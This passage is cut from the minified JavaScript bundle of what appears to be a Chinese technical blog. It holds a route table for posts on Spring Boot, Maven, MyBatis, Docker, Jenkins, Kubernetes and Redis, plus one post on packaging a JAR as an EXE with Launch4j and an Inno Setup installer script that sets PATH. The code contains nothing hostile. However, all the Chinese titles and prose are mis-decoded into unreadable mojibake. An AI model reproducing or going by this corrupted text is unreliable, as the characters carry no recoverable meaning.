Starter.html",redirect:"/spring/spring-boot/201/"},{name:"v-b3b797ce",path:"/spring/spring-boot/200/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-b3b797ce").then(t)}},{path:"/spring/spring-boot/200/index.html",redirect:"/spring/spring-boot/200/"},{path:"/00.java/20.Spring/23.springboot/200.SpringBoot ä¹ FilterãInterceptorãAspect.html",redirect:"/spring/spring-boot/200/"},{name:"v-63e5293d",path:"/spring/spring-boot/202/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-63e5293d").then(t)}},{path:"/spring/spring-boot/202/index.html",redirect:"/spring/spring-boot/202/"},{path:"/00.java/20.Spring/23.springboot/202.SpringBoot ä¹ Stomp ä½¿ç¨å vue ç¸éç½®.html",redirect:"/spring/spring-boot/202/"},{name:"v-4eb895bc",path:"/spring/spring-boot/203/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-4eb895bc").then(t)}},{path:"/spring/spring-boot/203/index.html",redirect:"/spring/spring-boot/203/"},{path:"/00.java/20.Spring/23.springboot/203.SpringBoot MyBatisPlus å®ç°å¤æ°æ®æº.html",redirect:"/spring/spring-boot/203/"},{name:"v-61e74299",path:"/spring/spring-boot/204/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-61e74299").then(t)}},{path:"/spring/spring-boot/204/index.html",redirect:"/spring/spring-boot/204/"},{path:"/00.java/20.Spring/23.springboot/204.SpringBoot MyBatis å¨æå»ºè¡¨.html",redirect:"/spring/spring-boot/204/"},{name:"v-f7296352",path:"/spring/spring-boot/205/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-f7296352").then(t)}},{path:"/spring/spring-boot/205/index.html",redirect:"/spring/spring-boot/205/"},{path:"/00.java/20.Spring/23.springboot/205.Spring Boot éæ Jasypt 3.0.3 éç½®æä»¶å å¯.html",redirect:"/spring/spring-boot/205/"},{name:"v-90a50632",path:"/spring/spring-boot/207/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-90a50632").then(t)}},{path:"/spring/spring-boot/207/index.html",redirect:"/spring/spring-boot/207/"},{path:"/00.java/20.Spring/23.springboot/207.Spring Boot VUEååç«¯å è§£å¯.html",redirect:"/spring/spring-boot/207/"},{name:"v-4452e22a",path:"/maven/2300/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-4452e22a").then(t)}},{path:"/maven/2300/index.html",redirect:"/maven/2300/"},{path:"/00.java/2300.maven/2300.pom æä»¶ä»ç»å parentãproperties æ ç­¾è¯¦è§£.html",redirect:"/maven/2300/"},{name:"v-689c946e",path:"/spring/spring-boot/206/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-689c946e").then(t)}},{path:"/spring/spring-boot/206/index.html",redirect:"/spring/spring-boot/206/"},{path:"/00.java/20.Spring/23.springboot/206.Spring Boot éæ FastDFS.html",redirect:"/spring/spring-boot/206/"},{name:"v-5783fd5e",path:"/maven/2302/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-5783fd5e").then(t)}},{path:"/maven/2302/index.html",redirect:"/maven/2302/"},{path:"/00.java/2300.maven/2302.ä½¿ç¨ Nexus3.x æ­å»ºç§æ.html",redirect:"/maven/2302/"},{name:"v-13c2056a",path:"/maven/2301/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-13c2056a").then(t)}},{path:"/maven/2301/index.html",redirect:"/maven/2301/"},{path:"/00.java/2300.maven/2301.dependencies æ ç­¾è¯¦è§£.html",redirect:"/maven/2301/"},{name:"v-41b48450",path:"/mybatis/mybatis/300/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-41b48450").then(t)}},{path:"/mybatis/mybatis/300/index.html",redirect:"/mybatis/mybatis/300/"},{path:"/00.java/30.Mybatis/31.mybatis/300.æ ¸å¿åè½æè§£ å·¥ä½æµç¨.html",redirect:"/mybatis/mybatis/300/"},{name:"v-6d19a90e",path:"/mybatis/mybatis/301/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-6d19a90e").then(t)}},{path:"/mybatis/mybatis/301/index.html",redirect:"/mybatis/mybatis/301/"},{path:"/00.java/30.Mybatis/31.mybatis/301.æ ¸å¿åè½æè§£ Pluginæä»¶åè½å®ç°.html",redirect:"/mybatis/mybatis/301/"},{name:"v-2504457e",path:"/mybatis/mybatis/302/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-2504457e").then(t)}},{path:"/mybatis/mybatis/302/index.html",redirect:"/mybatis/mybatis/302/"},{path:"/00.java/30.Mybatis/31.mybatis/302.æ ¸å¿åè½æè§£ ä¸äºçº§ç¼å­åç.html",redirect:"/mybatis/mybatis/302/"},{name:"v-74f21a38",path:"/mybatis/mybatis/303/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-74f21a38").then(t)}},{path:"/mybatis/mybatis/303/index.html",redirect:"/mybatis/mybatis/303/"},{path:"/00.java/30.Mybatis/31.mybatis/303.MyBatis Plus+Spring Boot å®ç°ä¸äºçº§ç¼å­ä»¥åèªå®ä¹ç¼å­.html",redirect:"/mybatis/mybatis/303/"},{name:"v-9d02e050",path:"/linux/2300/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-9d02e050").then(t)}},{path:"/linux/2300/index.html",redirect:"/linux/2300/"},{path:"/01.è¿ç»´/2300.linux/2300.Linux åå»ºç¨æ·åæéæä½.html",redirect:"/linux/2300/"},{name:"v-541435c6",path:"/linux/2301/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-541435c6").then(t)}},{path:"/linux/2301/index.html",redirect:"/linux/2301/"},{path:"/01.è¿ç»´/2300.linux/2301.Linux ç£çæä½ç¸å³å½ä»¤.html",redirect:"/linux/2301/"},{name:"v-1308af9d",path:"/linux/2302/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-1308af9d").then(t)}},{path:"/linux/2302/index.html",redirect:"/linux/2302/"},{path:"/01.è¿ç»´/2300.linux/2302.Linux ææ¬æ°æ®å¤çå·¥å·awkå½ä»¤.html",redirect:"/linux/2302/"},{name:"v-252f5a65",path:"/linux/2303/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-252f5a65").then(t)}},{path:"/linux/2303/index.html",redirect:"/linux/2303/"},{path:"/01.è¿ç»´/2300.linux/2303.Linux å®æ¶ä»»å¡.html",redirect:"/linux/2303/"},{name:"v-8da11b2c",path:"/linux/2304/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-8da11b2c").then(t)}},{path:"/linux/2304/index.html",redirect:"/linux/2304/"},{path:"/01.è¿ç»´/2300.linux/2304.Linux å½ä»¤æ»ç».html",redirect:"/linux/2304/"},{name:"v-62410f40",path:"/linux/2305/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-62410f40").then(t)}},{path:"/linux/2305/index.html",redirect:"/linux/2305/"},{path:"/01.è¿ç»´/2300.linux/2305.Linux 22ç«¯å£å¯¹å¤æ»å»è§£å³.html",redirect:"/linux/2305/"},{name:"v-7dd6a16f",path:"/docker/400/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-7dd6a16f").then(t)}},{path:"/docker/400/index.html",redirect:"/docker/400/"},{path:"/01.è¿ç»´/40.Docker/400.Docker æ¦å¿µãå½ä»¤åDockerfileä»ç».html",redirect:"/docker/400/"},{name:"v-12a39364",path:"/docker/401/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-12a39364").then(t)}},{path:"/docker/401/index.html",redirect:"/docker/401/"},{path:"/01.è¿ç»´/40.Docker/401.Docker-Compose å½ä»¤ååºæ¬ä½¿ç¨.html",redirect:"/docker/401/"},{name:"v-6ee475a8",path:"/docker/402/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-6ee475a8").then(t)}},{path:"/docker/402/index.html",redirect:"/docker/402/"},{path:"/01.è¿ç»´/40.Docker/402.Dockerç§æåºçå¼å.html",redirect:"/docker/402/"},{name:"v-78cfb480",path:"/jenkins/501/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-78cfb480").then(t)}},{path:"/jenkins/501/index.html",redirect:"/jenkins/501/"},{path:"/01.è¿ç»´/50.Jenkins/501.Jenkins(äº) Jenkinså®è£åç¯å¢éç½®.html",redirect:"/jenkins/501/"},{name:"v-16683504",path:"/jenkins/500/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-16683504").then(t)}},{path:"/jenkins/500/index.html",redirect:"/jenkins/500/"},{path:"/01.è¿ç»´/50.Jenkins/500.Jenkins(ä¸) æç»­éæåJenkinsä»ç».html",redirect:"/jenkins/500/"},{name:"v-a5b32138",path:"/jenkins/502/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-a5b32138").then(t)}},{path:"/jenkins/502/index.html",redirect:"/jenkins/502/"},{path:"/01.è¿ç»´/50.Jenkins/502.Jenkins(ä¸) Jenkinsç¨æ·ç®¡çåå­è¯.html",redirect:"/jenkins/502/"},{name:"v-45042106",path:"/jenkins/503/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-45042106").then(t)}},{path:"/jenkins/503/index.html",redirect:"/jenkins/503/"},{path:"/01.è¿ç»´/50.Jenkins/503.Jenkins(å) Mavenå®è£åéç½®.html",redirect:"/jenkins/503/"},{name:"v-eebfe876",path:"/jenkins/504/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-eebfe876").then(t)}},{path:"/jenkins/504/index.html",redirect:"/jenkins/504/"},{path:"/01.è¿ç»´/50.Jenkins/504.Jenkins(äº) Jenkinsæå»ºMavené¡¹ç®.html",redirect:"/jenkins/504/"},{name:"v-1652c501",path:"/jenkins/505/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-1652c501").then(t)}},{path:"/jenkins/505/index.html",redirect:"/jenkins/505/"},{path:"/01.è¿ç»´/50.Jenkins/505.Jenkins(å­) Jenkinsé¡¹ç®æå»ºç»è.html",redirect:"/jenkins/505/"},{name:"v-4d0793a3",path:"/kubernetes/600/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-4d0793a3").then(t)}},{path:"/kubernetes/600/index.html",redirect:"/kubernetes/600/"},{path:"/01.è¿ç»´/60.Kubernetes/600.kubernetes(ä¸) æ¦å¿µåä»ç».html",redirect:"/kubernetes/600/"},{name:"v-4b59fa74",path:"/jenkins/507/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-4b59fa74").then(t)}},{path:"/jenkins/507/index.html",redirect:"/jenkins/507/"},{path:"/01.è¿ç»´/50.Jenkins/507.Jenkins(å«) Jenkins+Docker+SpringCloudå¾®æå¡æç»­éæï¼ä¸ï¼.html",redirect:"/jenkins/507/"},{name:"v-7d7d4816",path:"/kubernetes/601/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-7d7d4816").then(t)}},{path:"/kubernetes/601/index.html",redirect:"/kubernetes/601/"},{path:"/01.è¿ç»´/60.Kubernetes/601.kubernetes(äº) éç¾¤ç¯å¢æ­å»º.html",redirect:"/kubernetes/601/"},{name:"v-a7c74124",path:"/jenkins/506/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-a7c74124").then(t)}},{path:"/jenkins/506/index.html",redirect:"/jenkins/506/"},{path:"/01.è¿ç»´/50.Jenkins/506.Jenkins(ä¸) Jenkins+Docker+SpringCloudå¾®æå¡æç»­éæï¼ä¸ï¼.html",redirect:"/jenkins/506/"},{name:"v-734bf71d",path:"/kubernetes/602/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-734bf71d").then(t)}},{path:"/kubernetes/602/index.html",redirect:"/kubernetes/602/"},{path:"/01.è¿ç»´/60.Kubernetes/602.kubernetes(ä¸) èµæºç®¡ç.html",redirect:"/kubernetes/602/"},{name:"v-62470732",path:"/kubernetes/603/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-62470732").then(t)}},{path:"/kubernetes/603/index.html",redirect:"/kubernetes/603/"},{path:"/01.è¿ç»´/60.Kubernetes/603.kubernetes(å) NamespaceãPodãLableãDeploymentãService çèµæºä»ç».html",redirect:"/kubernetes/603/"},{name:"v-668f65e8",path:"/kubernetes/604/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-668f65e8").then(t)}},{path:"/kubernetes/604/index.html",redirect:"/kubernetes/604/"},{path:"/01.è¿ç»´/60.Kubernetes/604.kubernetes(äº) Pod ä»ç»åéç½®.html",redirect:"/kubernetes/604/"},{name:"v-22acaa33",path:"/kubernetes/605/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-22acaa33").then(t)}},{path:"/kubernetes/605/index.html",redirect:"/kubernetes/605/"},{path:"/01.è¿ç»´/60.Kubernetes/605.kubernetes(å­) Pod çå½å¨æ.html",redirect:"/kubernetes/605/"},{name:"v-43fb77b9",path:"/kubernetes/607/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-43fb77b9").then(t)}},{path:"/kubernetes/607/index.html",redirect:"/kubernetes/607/"},{path:"/01.è¿ç»´/60.Kubernetes/607.kubernetes(å«) Pod æ§å¶å¨è¯¦è§£.html",redirect:"/kubernetes/607/"},{name:"v-79aee7c8",path:"/kubernetes/606/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-79aee7c8").then(t)}},{path:"/kubernetes/606/index.html",redirect:"/kubernetes/606/"},{path:"/01.è¿ç»´/60.Kubernetes/606.kubernetes(ä¸) Pod è°åº¦.html",redirect:"/kubernetes/606/"},{name:"v-5019f548",path:"/kubernetes/608/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-5019f548").then(t)}},{path:"/kubernetes/608/index.html",redirect:"/kubernetes/608/"},{path:"/01.è¿ç»´/60.Kubernetes/608.kubernetes(ä¹) Serviceä»ç»ãç±»ååä½¿ç¨.html",redirect:"/kubernetes/608/"},{name:"v-21c7009a",path:"/kubernetes/609/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-21c7009a").then(t)}},{path:"/kubernetes/609/index.html",redirect:"/kubernetes/609/"},{path:"/01.è¿ç»´/60.Kubernetes/609.kubernetes(å) Ingressä»ç»åä½¿ç¨.html",redirect:"/kubernetes/609/"},{name:"v-4fcd330d",path:"/kubernetes/610/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-4fcd330d").then(t)}},{path:"/kubernetes/610/index.html",redirect:"/kubernetes/610/"},{path:"/01.è¿ç»´/60.Kubernetes/610.kubernetes(åä¸) æ°æ®å­å¨ï¼æè½½å·ç®¡çï¼.html",redirect:"/kubernetes/610/"},{name:"v-6634edc1",path:"/kubernetes/611/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-6634edc1").then(t)}},{path:"/kubernetes/611/index.html",redirect:"/kubernetes/611/"},{path:"/01.è¿ç»´/60.Kubernetes/611.kubernetes(åäº) å®å¨è®¤è¯.html",redirect:"/kubernetes/611/"},{name:"v-a2835a8a",path:"/kubernetes/612/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-a2835a8a").then(t)}},{path:"/kubernetes/612/index.html",redirect:"/kubernetes/612/"},{path:"/01.è¿ç»´/60.Kubernetes/612.kubernetes(åä¸) DashBoard.html",redirect:"/kubernetes/612/"},{name:"v-46a82521",path:"/redis/1600/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-46a82521").then(t)}},{path:"/redis/1600/index.html",redirect:"/redis/1600/"},{path:"/04.ä¸­é´ä»¶/03.redis/1600.Redisä»ç».html",redirect:"/redis/1600/"},{name:"v-30342bb2",path:"/redis/1602/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-30342bb2").then(t)}},{path:"/redis/1602/index.html",redirect:"/redis/1602/"},{path:"/04.ä¸­é´ä»¶/03.redis/1602.Redisåå¸å¼éä»ç».html",redirect:"/redis/1602/"},{name:"v-3d481430",path:"/redis/1601/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-3d481430").then(t)}},{path:"/redis/1601/index.html",redirect:"/redis/1601/"},{path:"/04.ä¸­é´ä»¶/03.redis/1601.Rediså½ä»¤ä»ç».html",redirect:"/redis/1601/"},{name:"v-9f012bb0",path:"/Redis/1603/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-9f012bb0").then(t)}},{path:"/Redis/1603/index.html",redirect:"/Redis/1603/"},{path:"/04.ä¸­é´ä»¶/03.redis/1603.Redisäºå¡ä»ç».html",redirect:"/Redis/1603/"},{name:"v-19b3d0ca",path:"/Redis/1604/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-19b3d0ca").then(t)}},{path:"/Redis/1604/index.html",redirect:"/Redis/1604/"},{path:"/04.ä¸­é´ä»¶/03.redis/1604.Redisçkeyå¤±æéç¥ä»ç».html",redirect:"/Redis/1604/"},{name:"v-0a009914",path:"/Redis/1605/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-0a009914").then(t)}},{path:"/Redis/1605/index.html",redirect:"/Redis/1605/"},{path:"/04.ä¸­é´ä»¶/03.redis/1605.Rediséç½®æä»¶è§£è¯».html",redirect:"/Redis/1605/"},{name:"v-44f11504",path:"/Redis/1606/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-44f11504").then(t)}},{path:"/Redis/1606/index.html",redirect:"/Redis/1606/"},{path:"/04.ä¸­é´ä»¶/03.redis/1606.Redisè®°ä¸æ¬¡å®æºææ¥.html",redirect:"/Redis/1606/"},{name:"v-754a1f6d",path:"/Redis/1607/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-754a1f6d").then(t)}},{path:"/Redis/1607/index.html",redirect:"/Redis/1607/"},{path:"/04.ä¸­é´ä»¶/03.redis/1607.Redisé«å¯ç¨(ä¸) ä¸»ä»çè®º.html",redirect:"/Redis/1607/"},{name:"v-4a58f399",path:"/Redis/1609/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-4a58f399").then(t)}},{path:"/Redis/1609/index.html",redirect:"/Redis/1609/"},{path:"/04.ä¸­é´ä»¶/03.redis/1609.Redisé«å¯ç¨(ä¸) æ­å»º.html",redirect:"/Redis/1609/"},{name:"v-bb3e121a",path:"/Redis/1608/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-bb3e121a").then(t)}},{path:"/Redis/1608/index.html",redirect:"/Redis/1608/"},{path:"/04.ä¸­é´ä»¶/03.redis/1608.Redisé«å¯ç¨(äº) å¨åµçè®º.html",redirect:"/Redis/1608/"},{name:"v-59de6d20",path:"/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-59de6d20").then(t)}},{path:"/index.html",redirect:"/"},{path:"*",component:Js}],Ks={title:"ç¨åºåæé¿ææ¯åå®¢",description:"ææ¯åå®¢",base:"/",headTags:[["link",{rel:"icon",href:"/favicon.ico"}],["meta",{name:"viewport",content:"width=device-width,initial-scale=1,user-scalable=no"}]],pages:[{title:"JVM",frontmatter:{title:"JVM",date:"2023-06-25T09:22:36.000Z",permalink:"/java/100/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/10.java/100.java.html",relativePath:"00.java/10.java/100.java.md",key:"v-4a355d2a",path:"/java/100/",lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:null,content:"",normalizedContent:"",charsets:{}},{title:"jar æåæ.exeå¯æ§è¡æä»¶",frontmatter:{title:"jar æåæ.exeå¯æ§è¡æä»¶",date:"2023-06-25T09:22:36.000Z",permalink:"/java/101/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/10.java/101.%E6%89%93%E5%8C%85exe%E7%A8%8B%E5%BA%8F.html",relativePath:"00.java/10.java/101.æåexeç¨åº.md",key:"v-104240f2",path:"/java/101/",headers:[{level:2,title:"ä½¿ç¨ Launch4j",slug:"ä½¿ç¨-launch4j",normalizedTitle:"ä½¿ç¨ launch4j",charIndex:33},{level:3,title:"Basic",slug:"basic",normalizedTitle:"basic",charIndex:1575},{level:3,title:"JRE",slug:"jre",normalizedTitle:"jre",charIndex:697},{level:3,title:"",slug:"",normalizedTitle:"",charIndex:0},{level:2,title:"ä½¿ç¨ Inno Setup",slug:"ä½¿ç¨-inno-setup",normalizedTitle:"ä½¿ç¨ inno setup",charIndex:1794},{level:3,title:"Setup",slug:"setup",normalizedTitle:"setup",charIndex:52},{level:3,title:"Dirs",slug:"dirs",normalizedTitle:"dirs",charIndex:2235},{level:3,title:"Files",slug:"files",normalizedTitle:"files",charIndex:1998},{level:3,title:"Registry",slug:"registry",normalizedTitle:"registry",charIndex:2422},{level:3,title:"Run",slug:"run",normalizedTitle:"run",charIndex:2600}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"ä½¿ç¨ Launch4j Basic JRE  ä½¿ç¨ Inno Setup Setup Dirs Files Registry Run",content:'è¦å°ä¸ä¸ª Java JAR æä»¶æåæå¯æ§è¡ç EXE æä»¶ï¼å¯ä»¥ä½¿ç¨ Launch4j å Inno Setup æ¥å®æè¿ä¸ªä»»å¡ã\n\nLaunch4j ç¨äºå° Java åºç¨ç¨åºæåä¸ºæ¬æºå¯æ§è¡æä»¶ï¼éå¸¸ä¸º EXE æä»¶ï¼çå·¥å·ãå®çä¸»è¦ä½ç¨æ¯åå»ºä¸ä¸ªåè£å¨ï¼åè®¸ç¨æ·åè¿è¡æ¬æº Windows åºç¨ç¨åºä¸æ ·è¿è¡ Java åºç¨ç¨åºï¼èæ éæå¨å¯å¨ Java èææºï¼JVMï¼ã Launch4j æ¯ä¸ä¸ªåè´¹çå¼æºé¡¹ç®ï¼å®éµå¾ª GNU General Public Licenseï¼GPLï¼è®¸å¯è¯ãè¿æå³çä½ å¯ä»¥åè´¹ä½¿ç¨ Launch4j æ¥åå»ºå¯æ§è¡æä»¶ï¼åæ¬åä¸ç¨éãä½ å¯ä»¥ä» Launch4j çå®æ¹ç½ç«ä¸è½½å¹¶ä½¿ç¨å®ï¼æ éæ¯ä»è®¸å¯è´¹ç¨ãå®ç½å°å\n\nLaunch4j åè½æï¼\n\n * åå»ºæ¬æºå¯æ§è¡æä»¶ï¼Launch4j åè®¸ä½ å°ä½ ç Java åºç¨ç¨åºæåä¸ºä¸ä¸ªæ¬æºçå¯æ§è¡æä»¶ï¼éå¸¸æ¯ EXE æä»¶ï¼ãè¿æå³çç¨æ·å¯ä»¥åå»è¯¥æä»¶æ¥è¿è¡ä½ ç Java åºç¨ç¨åºï¼èæ éæå¨æå¼å½ä»¤è¡æ JVMã\n * èªå®ä¹å¯æ§è¡æä»¶å±æ§ï¼ä½ å¯ä»¥éè¿ Launch4j éç½®å¯æ§è¡æä»¶çåç§å±æ§ï¼å¦ç¨åºå¾æ ãæä»¶çæ¬ä¿¡æ¯ãæ é¢ç­ãè¿æå©äºä½¿ä½ ç Java åºç¨ç¨åºçèµ·æ¥åæ¬æº Windows åºç¨ç¨åºã\n * æ¯æç±»è·¯å¾å JAR æä»¶ï¼Launch4j åè®¸ä½ æå®åºç¨ç¨åºçç±»è·¯å¾åå³èç JAR æä»¶ï¼ä»¥ç¡®ä¿ä½ ç Java åºç¨ç¨åºè½å¤æ­£å¸¸è¿è¡ã\n * èªå¨æ£æµ Main-Classï¼å®å¯ä»¥èªå¨æ£æµä½ ç JAR æä»¶ä¸­ç Main-Classï¼ä»èæ éæå¨æå®åºç¨ç¨åºçå¥å£ç¹ã\n * æ¯æ JRE éé¡¹ï¼ä½ å¯ä»¥éæ©å° JREï¼Java è¿è¡æ¶ç¯å¢ï¼æåå°çæçå¯æ§è¡æä»¶ä¸­ï¼ä»èç¨æ·æ éå®è£ JRE å³å¯è¿è¡ä½ çåºç¨ç¨åºã\n * è·¨å¹³å°å¼å®¹æ§ï¼çæçå¯æ§è¡æä»¶éå¸¸åªè½å¨ Windows ä¸è¿è¡ï¼ä½ Launch4j å¯ä»¥å¨ Windows ä¸åå»ºç¨äºå¶ä»å¹³å°çåè£å¨ï¼ä¾å¦ Linux æ macOSã\n\nInno Setup æ¬èº«ä¸è½ç´æ¥å° JAR æä»¶æåæ EXE æä»¶ãæä»¥æä»¬è¦åä½¿ç¨ Launch4j æ jar æåæä¸ä¸ª exe æ ¼å¼çå¯æ§è¡ç¨åºãInno Setup æ¯ä¸ä¸ªåè´¹çå¼æºå®è£å¶ä½å·¥å·ï¼å®éµå¾ªè®¸å¯è¯åè®¸åè´¹ä½¿ç¨ï¼åæ¬åä¸ç¨éãInno Setup çä¸»è¦ä½ç¨æ¯åå»ºç¨äºå®è£åå¸è½½ Windows åºç¨ç¨åºçå®è£ç¨åºãå®ç½å°å\n\nInno Setup åè½æï¼\n\n * åå»ºèªå®ä¹å®è£ç¨åºï¼Inno Setup åè®¸å¼åäººååå»ºå®å¶çãæäºä½¿ç¨çå®è£ç¨åºï¼ç¨äºå°ä»ä»¬çåºç¨ç¨åºé¨ç½²å° Windows æä½ç³»ç»ä¸ãä½ å¯ä»¥å®ä¹å®è£è¿ç¨çåä¸ªæ¹é¢ï¼åæ¬æä»¶å¤å¶ãæ³¨åè¡¨é¡¹ãå¿«æ·æ¹å¼ãå¼å§èåé¡¹ç­ã\n * æ¯æå¤ç§å®è£ä»»å¡ï¼Inno Setup æ¯æåç§åæ ·çå®è£ä»»å¡ï¼åæ¬ç®åçæä»¶å¤å¶ï¼æ³¨åè¡¨è®¾ç½®ï¼åå»ºå¿«æ·æ¹å¼ï¼ä»¥åæ§è¡èªå®ä¹èæ¬åä»»å¡ãè¿ä½¿å¾ä½ å¯ä»¥è½»æ¾å°èªå®ä¹å®è£è¿ç¨ï¼ä»¥æ»¡è¶³ä½ çåºç¨ç¨åºçç¹å®éæ±ã\n * èæ¬åï¼Inno Setup ä½¿ç¨åºäºèæ¬çè¯­è¨æ¥å®ä¹å®è£è¿ç¨ãè¿æå³çä½ å¯ä»¥ç¼åèæ¬æ¥æè¿°å®è£ç¨åºçè¡ä¸ºï¼ä½¿å¶éå¸¸çµæ´»ãInno Setup ä½¿ç¨ç±»ä¼¼äº Pascal çèæ¬è¯­è¨ã\n * å¤è¯­è¨æ¯æï¼Inno Setup æ¯æå¤ç§è¯­è¨ï¼åè®¸ä½ ä¸ºä¸åçç¨æ·ç¾¤ä½åå»ºå¤è¯­è¨å®è£ç¨åºï¼ä»¥æä¾æ¬å°åçå®è£åå¸è½½ä½éªã\n * å¸è½½æ¯æï¼Inno Setup ä¸ä»å¯ä»¥åå»ºå®è£ç¨åºï¼è¿å¯ä»¥çæå¸è½½ç¨åºï¼åè®¸ç¨æ·ä»ä»ä»¬çè®¡ç®æºä¸å¸è½½ä½ çåºç¨ç¨åºã\n\n\n# ä½¿ç¨ Launch4j\n\nLaunch4j æ jar åè£æ .exe ç¨åºè¿æ¯ææå±éçï¼æ¯å¦å¯å¨æ¹å¼åªè½æ¯ java -jarï¼å¦æéåæ··æ·å°±æ²¡æåæ³\n\n\n# Basic\n\nå¨è¿ééç½®è·¯å¾ç­ä¿¡æ¯\n\n\n\nOutput file: å¡«åæ jar ææ.exe ç¨åºçè¾åºè·¯å¾\njarï¼éæ©èªå·±è¦æåç jar\n\n\n# JRE\n\nå¨è¿ééç½® JVMï¼JDK çæ¬ç­ä¿¡æ¯\n\n\n\nJRE pathsï¼ä¸éè¦æä»¬å¡«\nMin JRE versionï¼æä½ JDK çæ¬\nMax JRE versionï¼æé« JDK çæ¬\nJVM optionï¼è®¾ç½® JVM å¯å¨åæ°\n\n\n#\n\nè®¾ç½® console\n\n\n\n# ä½¿ç¨ Inno Setup\n\nInno Setup è¿æ¯æäºé¾åº¦çï¼éè¦å­¦ä¹ éé¢çåä¸ªå³é®å­ï¼åè°ï¼äºä»¶ç­ï¼æè½ææ¡ Inno Setup çä½¿ç¨\n\nä»¥ä¸è´´ä¸ä¸ªç®åç Inno Setup ç¤ºä¾\n\n;éç½®åæè¿°å®è£ç¨åºçæ´ä½è®¾ç½®åè¡ä¸º\n[Setup]\n; åºç¨åç§°\nAppName=Easy-Manager-Tool\n; åºç¨çæ¬\nAppVersion=1.0\n; é»è®¤å®è£ç®å½ {pf}ä¸º Program Files è¿ä¸ªè·¯å¾æ¯ç±»ä¼¼äº C:\\Program Files çå½¢å¼\nDefaultDirName={pf}\\emt\n; åºç¨è¾åºå°æä»¶è·¯å¾\nOutputDir=C:\\Users\\User\\Desktop\\tool\\gen\n; è¾åºæä»¶çåç§°\nOutputBaseFilename=emt\n; æå®åºç¨ç¨åºçåå¸èæå¬å¸åç§°\nAppPublisher=\n; åºç¨ç¨åºåå¸èçç½ç«æURL\nAppPublisherURL=\n\n; åå»ºç®å½ {app} å½è¡¨åºç¨æå¨çè·¯å¾\n[Dirs]\nName: "{app}\\go"; Permissions: everyone-full\n\n; æ·»å æä»¶\n[Files]\nSource: "C:\\Users\\User\\Desktop\\build\\*"; DestDir: "{app}"; Flags: ignoreversion recursesubdirs createallsubdirs\n\n; æ³¨åè¡¨\n[Registry]\nRoot: HKLM; Subkey: "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment"; ValueType: string; ValueName: "Path"; ValueData: "{olddata};{app}\\jdk\\bin"\n\n; è¿è¡èæ¬\n[Run]\nFilename: "{sys}\\cmd.exe"; Parameters: "/C setx PATH ""{app}\\go\\bin;%PATH%"""; Flags: runasoriginaluser; StatusMsg: "Setting PATH for Go..."; Check: not Is64BitInstallMode\nFilename: "{app}\\runBuild.bat"; Description: "runBuild.bat";\nFilename: "cmd.exe"; Parameters: "/c setx PATH ""%PATH%;{app}\\jdk\\bin"" /m"; Flags: runhidden; WorkingDir: {app}; StatusMsg: "Updating PATH environment variable..."\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# Setup\n\nç¨äºéç½®åæè¿°å®è£ç¨åºçæ´ä½è®¾ç½®åè¡ä¸ºãå¨ 